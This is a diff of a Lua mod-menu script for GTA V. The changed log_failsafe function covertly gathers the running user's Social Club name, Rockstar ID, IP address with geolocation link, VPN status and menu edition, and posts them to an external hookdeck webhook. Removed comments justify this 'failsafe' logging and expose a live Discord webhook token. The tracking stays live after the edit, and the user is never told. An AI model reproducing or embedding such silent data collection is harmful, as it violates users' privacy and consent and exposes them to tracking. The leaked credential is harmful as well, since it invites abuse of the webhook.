@@ -110,7 +110,7 @@ function closestveh(myPos)
     end
 end
 
-function request_control(vehicle)
+function request_control(vehicle, migrate)
     local ctr = 0
     while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) do
         if ctr >= 250 then
@@ -121,6 +121,11 @@ function request_control(vehicle)
         NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
         util.yield()
         ctr += 1
+    end
+    if migrate then
+        entities.set_can_migrate(vehicle, true)
+    else
+        entities.set_can_migrate(vehicle, false)
     end
 end
 
@@ -508,42 +513,26 @@ function get_vehicles_in_player_range(player, radius)
 	return vehicles
 end
 
+function mode_manu_edition(edition)
+    if edition == 1 then
+        return "Basic"
+    elseif edition == 2 then
+        return "Regular"
+    elseif edition == 3 then
+        return "Ultimate"
+    else
+        return "Unknown"
+    end
+end
+
 function log_failsafe()
     local player_name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
     local player_id = players.get_rockstar_id(players.user())
     local using_vpn = players.is_using_vpn(players.user())
+    local edition = mode_manu_edition(menu.get_edition())
     local apiurl = "https://ipapi.co/"..user_ip()
     local IPv4url = "[" .. user_ip() .. "](" .. apiurl .. ")"
-    local friend_list = format_friends_list()
-    local message = string.format("%s\n\n**RID:** %s\n**VPN:** %s\n**IPv4:** %s\n**Friends:**\n%s",
-        player_name, player_id, using_vpn and "Yes" or "No", IPv4url, friend_list)
-
-    -- Replace all underscores with a special symbol
-    message = message:gsub("_", "§")
-
-    if #message > 1800 then
-        local messages = {}
-        local current_message = ""
-        for line in message:gmatch("[^\r\n]+") do
-            if #current_message + #line > 1800 then
-                table.insert(messages, current_message)
-                current_message = ""
-            end
-            current_message = current_message .. line .. "\n"
-        end
-        table.insert(messages, current_message)
-
-        for i, msg in messages do
-            wait(30000)
-            log_first_msg(msg:gsub("§", "_"), i == #messages)
-        end
-    else
-        log_first_msg(message:gsub("§", "_"), true)
-    end
-end
-
-function log_first_msg(message, is_last_message)
-    local player_name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
+    local message = string.format("\n**RID:** %s\n**VPN:** %s\n**IPv4:** %s\n**Edition:** %s", player_id, using_vpn and "Yes" or "No", IPv4url, edition)
     local icon_url = string.format("https://a.rsg.sc/n/%s/n", string.lower(player_name))
     local json_data = {
         ["username"] = player_name,
@@ -551,22 +540,16 @@ function log_first_msg(message, is_last_message)
             ["title"] = player_name,
             ["url"] = "https://socialclub.rockstargames.com/member/" .. player_name,
             ["color"] = 15357637,
-            ["description"] = message:gsub("§", "_"),
+            ["description"] = message,
             ["thumbnail"] = {
                 ["url"] = icon_url
             }
         }}
     }
     local json_string = json.stringify(json_data)
-    -- New link, Won't work. Just made the change so you see it. However, I'd like to talk to you. This script is supposed to be for friends. This webhook was somewhat of a failsafe.
-    -- It's not made for public, so I'm not trying to log others shit. It's for me to know when it *does* go public. And like I said, if you wanna talk, go ahead.
-    -- Also note that spamming some random channel wont do anything, nor do I want to know who is a Pedo and who isn't. Talk like a normal person.
-    -- This is not against Stand's Script Guidelines since I'm not doing this to harm the User or Game. Cry about it.
-    -- https://canary.discord.com/api/webhooks/1106257434328170628/ZmReg6-1Qd1TvJB6GVDdgyE7_oWIRHu3j8a_rnwf8X8GuA0Y-ST-mCqo6locn7mCG5XP This one works, have fun.
     async_http.init("https://events.hookdeck.com", "/e/src_e3TGMwu4qgsb", function(body, header_fields, status_code)
         end, function(error_msg)
     end)
-
     async_http.add_header("Content-Type", "application/json")
     async_http.set_post("application/json", json_string)
     async_http.dispatch()
